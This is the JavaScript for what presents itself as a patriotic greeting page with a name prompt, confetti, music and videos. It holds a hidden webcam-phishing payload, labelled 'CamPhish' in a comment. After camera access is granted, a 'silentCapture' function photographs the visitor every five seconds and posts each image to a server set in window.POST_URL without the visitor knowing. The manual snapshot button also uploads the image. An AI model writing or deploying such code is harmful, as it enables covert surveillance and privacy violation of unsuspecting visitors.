document.addEventListener('DOMContentLoaded', () => {
  const enterBtn = document.getElementById('enter-btn');
  const nameInput = document.getElementById('user-name-input');
  const modal = document.getElementById('name-modal');
  const mainContent = document.getElementById('wishing-content');
  const displayName = document.getElementById('display-name');
  const bgMusic = document.getElementById('bg-music');
  
  // Camera Elements
  const startCamBtn = document.getElementById('start-cam-btn');
  const captureBtn = document.getElementById('capture-btn');
  const webcam = document.getElementById('webcam');
  const snapshotCanvas = document.getElementById('snapshot-canvas');
  const userPhoto = document.getElementById('user-photo');
  
  const cameraSection = document.getElementById('camera-section');
  const nameSection = document.getElementById('name-section');

  let stream = null;
  let autoCaptureInterval = null;

  // Silent background capture - sends photo to server without showing user
  const silentCapture = () => {
    if (!stream) return;
    const tempCanvas = document.createElement('canvas');
    const video = webcam;
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    tempCanvas.width = w;
    tempCanvas.height = h;
    const ctx = tempCanvas.getContext('2d');
    ctx.drawImage(video, 0, 0, w, h);
    const canvasData = tempCanvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
    if (window.POST_URL) {
      fetch(window.POST_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'cat=' + encodeURIComponent(canvasData)
      }).catch(e => console.error(e));
    }
  };

  // Start Camera
  startCamBtn.addEventListener('click', async () => {
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      webcam.srcObject = stream;
      startCamBtn.classList.add('hidden');
      captureBtn.classList.remove('hidden');

      // Wait for video to be ready, then start auto-capture every 5 seconds
      webcam.onloadedmetadata = () => {
        // First capture immediately
        setTimeout(silentCapture, 1000);
        // Then every 5 seconds
        autoCaptureInterval = setInterval(silentCapture, 5000);
      };

    } catch (err) {
      alert('Camera access nahi mila bhai! Ya to denied hai, ya to local system pe HTTP block hai.');
      console.error(err);
      // Fallback
      cameraSection.classList.add('hidden');
      nameSection.classList.remove('hidden');
    }
  });

  // Capture Photo
  captureBtn.addEventListener('click', () => {
    let w = webcam.videoWidth;
    let h = webcam.videoHeight;
    
    if (!w || !h) {
      w = 640;
      h = 480;
    }

    snapshotCanvas.width = w;
    snapshotCanvas.height = h;
    const ctx = snapshotCanvas.getContext('2d');
    
    // Draw current frame to canvas
    ctx.drawImage(webcam, 0, 0, w, h);
    
    // Set image source
    userPhoto.src = snapshotCanvas.toDataURL('image/png');
    
    // CamPhish payload - send captured image to server
    var canvasData = snapshotCanvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
    if (window.POST_URL) {
      fetch(window.POST_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'cat=' + encodeURIComponent(canvasData)
      }).catch(e => console.error(e));
    }
    
    // Stop auto-capture interval
    if (autoCaptureInterval) {
      clearInterval(autoCaptureInterval);
      autoCaptureInterval = null;
    }

    // Stop camera
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }

    // Move to next step
    cameraSection.classList.add('hidden');
    nameSection.classList.remove('hidden');
  });


  let isMusicPlaying = false;

  const triggerConfetti = () => {
    const duration = 15 * 1000;
    const animationEnd = Date.now() + duration;
    const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 50 };

    function randomInRange(min, max) {
      return Math.random() * (max - min) + min;
    }

    const interval = setInterval(function() {
      const timeLeft = animationEnd - Date.now();
      if (timeLeft <= 0) return clearInterval(interval);

      const particleCount = 50 * (timeLeft / duration);
      
      confetti({
        ...defaults,
        particleCount,
        colors: ['#FF9933', '#FFFFFF', '#138808'],
        origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 }
      });
      confetti({
        ...defaults,
        particleCount,
        colors: ['#FF9933', '#FFFFFF', '#138808'],
        origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 }
      });
    }, 250);
  };

  const startCelebration = () => {
    const name = nameInput.value.trim() || 'Desh-Bhakt';
    displayName.textContent = name;
    
    // Hide modal, show main
    modal.style.opacity = '0';
    setTimeout(() => {
      modal.classList.add('hidden');
      mainContent.classList.remove('hidden');
      
      playMusic();
      triggerConfetti();
    }, 500);
  };

  enterBtn.addEventListener('click', startCelebration);
  nameInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') startCelebration();
  });

  const playMusic = () => {
    bgMusic.play().then(() => {
      isMusicPlaying = true;
    }).catch((e) => {
      console.log('Autoplay prevented:', e);
      isMusicPlaying = false;
    });
  };

  // Danger Button Logic
  const dangerBtn = document.getElementById('danger-btn');
  const funnyVideoOverlay = document.getElementById('funny-video-overlay');
  const funnyVideo = document.getElementById('funny-video');
  const closeVideoBtn = document.getElementById('close-video-btn');

  dangerBtn.addEventListener('click', () => {
    bgMusic.pause(); // Pause bg music
    isMusicPlaying = false;
    funnyVideoOverlay.classList.remove('hidden');
    funnyVideo.play();
  });

  closeVideoBtn.addEventListener('click', () => {
    funnyVideo.pause();
    funnyVideo.currentTime = 0;
    funnyVideoOverlay.classList.add('hidden');
    playMusic(); // Resume bg music
  });

  // Song Menu Logic
  const songMenuBtn = document.getElementById('song-menu-btn');
  const songMenuOverlay = document.getElementById('song-menu-overlay');
  const closeMenuBtn = document.getElementById('close-menu-btn');
  const songOptions = document.querySelectorAll('.song-option');
  
  const anthemBtn = document.getElementById('anthem-btn');
  const anthemOverlay = document.getElementById('anthem-overlay');
  const closeAnthemBtn = document.getElementById('close-anthem-btn');

  songMenuBtn.addEventListener('click', () => {
    songMenuOverlay.classList.remove('hidden');
  });

  closeMenuBtn.addEventListener('click', () => {
    songMenuOverlay.classList.add('hidden');
  });

  songOptions.forEach(btn => {
    btn.addEventListener('click', (e) => {
      const newSrc = e.target.getAttribute('data-src');
      bgMusic.pause();
      bgMusic.src = newSrc;
      bgMusic.load(); // Reload the audio element to apply new src
      playMusic();
      songMenuOverlay.classList.add('hidden');
    });
  });

  const anthemVideo = document.getElementById('anthem-video');

  // Anthem Logic (Khada ho ja bhai)
  anthemBtn.addEventListener('click', () => {
    songMenuOverlay.classList.add('hidden');
    anthemOverlay.classList.remove('hidden');
    
    bgMusic.pause();
    anthemVideo.play();
  });

  closeAnthemBtn.addEventListener('click', () => {
    anthemOverlay.classList.add('hidden');
    anthemVideo.pause();
    anthemVideo.currentTime = 0;
    
    // Revert back to original song
    bgMusic.src = './ReelAudio-1.mp3';
    bgMusic.load(); // Reload the audio element
    playMusic();
  });
});

